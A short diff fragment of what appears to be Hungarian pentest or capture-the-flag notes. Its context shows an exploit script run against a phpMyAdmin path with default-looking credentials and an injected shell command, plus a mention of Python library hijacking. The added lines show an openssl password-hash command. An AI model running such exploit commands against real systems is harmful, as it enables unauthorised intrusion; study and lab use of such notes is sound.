@@ -149,3 +149,9 @@ python3 50457.py  40.0.5.16 80 /phpmyadmin pma pmapass "cd /tmp; rm -rf /tmp/she
 
        ```
  3. Python library hyjacking
+ 4. 
+
+ ## Jelszó generálás
+ ```
+openssl passwd -5 alma
+```
